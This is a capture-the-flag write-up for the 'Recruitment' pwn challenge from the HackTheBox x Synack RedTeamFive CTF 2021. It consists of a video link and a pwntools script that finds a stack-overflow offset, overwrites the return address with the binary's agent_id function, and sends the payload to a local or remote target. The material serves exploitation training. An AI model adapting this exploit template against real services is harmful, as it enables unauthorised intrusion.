---
name: Recruitment (2021)
event: HackTheBox x Synack RedTeamFive CTF 2021
category: Pwn
description: Writeup for Recruitment (pwn) - HackTheBox x Synack RedTeamFive CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Recruitment

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/Kqu3qpYMml8/0.jpg)](https://youtu.be/Kqu3qpYMml8?t=1804s "HackTheBox x Synack RedTeamFive 2021: Recruitment")

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './recruitment'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP offset
offset = find_eip(cyclic(100))

# Start program
io = start()

# Build the payload
payload = flat({offset: elf.symbols.agent_id})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('>', payload)

# Get our flag!
io.interactive()
```
{% endcode %}
